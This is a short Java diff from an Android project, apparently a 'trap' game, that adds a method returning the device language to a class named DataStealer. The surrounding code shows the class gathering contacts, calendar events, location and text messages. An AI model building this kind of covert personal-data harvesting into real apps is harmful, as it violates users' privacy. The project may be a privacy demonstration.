@@ -23,6 +23,7 @@ import java.util.concurrent.TimeUnit;
 
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
+import de.hpi3d.gamepgrog.trap.datatypes.Language;
 import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
 import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
 import de.hpi3d.gamepgrog.trap.future.Consumer;
@@ -143,6 +144,13 @@ public class DataStealer {
                 null);
 
         return CalendarEvent.createFromCursor(cursor);
+    }
+
+    public static ArrayList<Language> takeLanguage(Context c) { // Argument for lambdas
+        ArrayList<Language> languageList = new ArrayList<>();
+        languageList.add(Language.getCurrentLanguage());
+        return languageList;
+
     }
 
     public DataStealer(FusedLocationProviderClient client) {
